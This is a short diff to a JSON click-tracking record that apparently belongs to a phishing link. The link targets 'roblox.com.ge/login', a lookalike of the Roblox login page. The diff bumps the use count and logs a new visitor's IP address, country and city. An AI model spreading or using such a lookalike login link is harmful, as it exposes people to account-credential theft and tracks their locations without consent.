@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1190,
+    "useCount": 1191,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9664,6 +9664,14 @@
         "city": "Tirana",
         "flag": "🇦🇱",
         "countryCode": "AL"
+      },
+      {
+        "timestamp": 1777302048116,
+        "ip": "58.69.177.230",
+        "country": "Philippines",
+        "city": "Manila",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
